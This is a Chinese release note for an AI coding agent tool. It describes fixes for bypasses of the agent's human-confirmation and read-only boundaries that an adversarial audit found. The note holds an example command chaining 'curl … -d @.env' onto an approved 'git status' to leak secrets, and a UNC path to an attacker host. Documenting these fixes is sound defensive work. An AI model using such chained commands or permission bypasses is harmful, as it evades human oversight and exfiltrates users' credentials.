# ACE v3.45.0 —— 安全边界再加固 · 首屏重开

> 面向用户的更新介绍，可直接贴进 GitHub Release。
> 一句话摘要：**这一版把"人点头"和"只读"两条边界补成真的（H-27 ~ H-32），
> 同时把入口重做了一遍** —— README 首屏从一张表格变成「3 行 TL;DR + 一行 quickstart + 自播放演示图」，
> 安全边界收成一份 11 问的 FAQ，`docs/` 按用途分目录（扁平 **59 → 19**）。

## 先跑起来

```bash
python ai_code.py --mock      # 离线、不需要密钥、不需要联网：完整模型 ↔ 执行层闭环
```

<p align="center">
  <img src="../demo/demo.svg" alt="真实录制的离线会话：提问 → 工具调用 → 回答 → 状态栏" width="820">
</p>

图是**真实录制**的，不是效果图：用 `python demo/record_demo.py` 重录，
或用 `python demo/record_demo.py --check` 验证它没有腐化（CI 每次 push 都跑）。

## 🛡️ 安全：两条边界补成真的（H-27 ~ H-32）

来源是对 `tools/` 扩展面的**独立对抗性审计**（5 条），逐条在现码上复现后立项，见
[`docs/design/CONFIRM-BOUNDARY.md`](../design/CONFIRM-BOUNDARY.md)。

- **H-27 前缀免确认被 shell 组合符绕过（一次点头 = 任意命令）**：`command_prefix` 只取前两个空白
  token、不做 shell 解析，而免确认判据用它。于是批准一次 `git status` 之后，
  `git status && curl … -d @.env` 的前缀**同样是** `git status` —— 两个出口同时放行。
  修在判据处：含 shell 组合 / 替换 / 重定向字符的命令返回 `""`（= 不参与免确认，fail-close）。
- **H-28 确认框不再让人盲批 + 文件不再交给 ShellExecute**：`edit_file` 的确认预览取
  `command or code`，而它的参数是 `path` ⇒ 人看到的是「需要用户逐次确认: 」后面**没有对象**。
  新增 `confirm_subject()`；另外文件**不再**交给 `os.startfile`（那走的是"该后缀的关联动作"，
  而 `.py` 的关联动作就是**运行**它）：文件只交给已知编辑器，没有就退回可点击链接。
- **H-29 只读工具的"只读"要真的是只读**：`git branch` 的名字只读、动作不读（`-D` 删分支 /
  `-m` 改名），改为只放行**列举旗标**；`ls`/`dir` 此前**连敏感目标判定都不调**
  （只有 `cat` 调），于是同一份情报 `cat` 挡、`ls` 放 —— 现在两者用同一个判据。
- **H-30 没有 OS 边界就不执行**：`code_execute` 在拿不到 OS 级边界时返回 **503**，
  **绝不静默回退到宿主**（与既有 `job`/`docker` 档同一条口径）。
- **H-31 测试隔离** / **H-32 授权令接线状态与文档同口径**（并新增文档守卫，
  让"承诺了但没接线"这类漂移在本地就红）。

## ✨ 体验：主前端拿到真事件

- 引擎**真的**发出 `model_delta` 与 `status` 事件（此前主前端的流式与底栏是空的）。
- 底栏改用**引擎分段**；新增 `npm run preview`，界面终于能"看一眼"。

## 📄 入口与文档：这次把"第一次来的人"当回事

- **README 首屏重做**：原来的 `### At a glance` 三行长表格 → **3 行 TL;DR + 一行 quickstart +
  自播放演示图**。信息一条没丢，但第一个屏幕从"这是什么"变成"怎么跑"。
- **新增 [`docs/security/SECURITY-FAQ.md`](../security/SECURITY-FAQ.md)（11 问）**：
  把散在各处的口径收成问答，每条都写明去哪段代码、哪条断言核实。两问是刻意挑出的反直觉项 ——
  *无人值守时 fail-close 的是"要问人的那些"，不是"危险的那些"*，
  以及 *快照不覆盖 `.git` / `.guardian` / `.ace_sessions` 与凭据文件*（删了就是没了）。
- **新增 [`docs/ROADMAP.md`](../ROADMAP.md)**（能力路线图：四支柱兼得定位 / 语言裁决 /
  38 个功能模块 / 工作面）与 **[`docs/design/THREE-LAYERS.md`](../design/THREE-LAYERS.md)**
  （三层脊柱设计卡：驱动 / 响应 / 自愈）。
- **docs 结构整理**：扁平 **59 → 19**，按用途收进 `releases/`（36 篇）、`security/`（3 篇）、
  `adr/`（2 篇），并新增 **[`docs/README.md`](../README.md)** 作为"我想干什么 → 读哪篇"的索引。
- **README 瘦身**：英文 304 → 274 行、中文 322 → 296 行，砍掉的全是在 docs 里已有的重复。

## 这一版里被实测改掉的几处（都不是"顺手"）

1. **H-29 的 UNC 断言在 POSIX 上形同虚设** —— CI 单条红、本机全绿。病因是 `shlex.split`
   会**吃掉反斜杠**（`\\attacker.tld\share` → `\attacker.tldshare`）。第一次修不完整，
   第二次在本机用 `os.name = "posix"` 复现出该分支才修对。
2. **证据包的原始输出表在结构整理时没有跟着改**：`evidence-pack/RELEASES.md` §1 是当时
   `git ls-files | grep …` 的原始输出，**改它就是篡改证据**。所以只加了一条带日期的路径变更说明，
   讲清"重跑同一条命令会看到什么、差异只来自这次移动、文件内容一字未改"。
3. **README 的 `Docs map` 用反引号纯文本而不是 markdown 链接**，所以链接检查器抓不到它 ——
   结构整理后它**仍然指向旧路径**。现已改成真链接。教训：检查器只覆盖它认识的语法。

## 验证到什么程度

- `python test_all.py --only 38,39,40,68` = **41/41**（结构一致性 / 文档数字单一来源 /
  安全审计 payload 回归 / 无乱码）。
- `python demo/record_demo.py --check` = **4/4**（四张演示图都已重录到本版本号；
  `[68]` 会断言"图上印的版本 == `core/version.py`"，改了版本不重录就红）。
- 一次性的**链接检查器**：失效链接 **114 → 6**，剩下 6 条是 `sandbox://` / `dsh-session:`
  这类伪 URL 与既有乱码，不是文件链接。

## 诚实边界（没变的那些）

不开 `--sandbox job` / `--sandbox docker` 时，上面这些仍然只是**进程内策略**，
**不是 OS 级隔离**。想要真正的边界请开沙箱档；拿不到边界时一律 **503，绝不静默回退宿主**。
完整口径见 [`docs/security/SECURITY-FAQ.md`](../security/SECURITY-FAQ.md)。
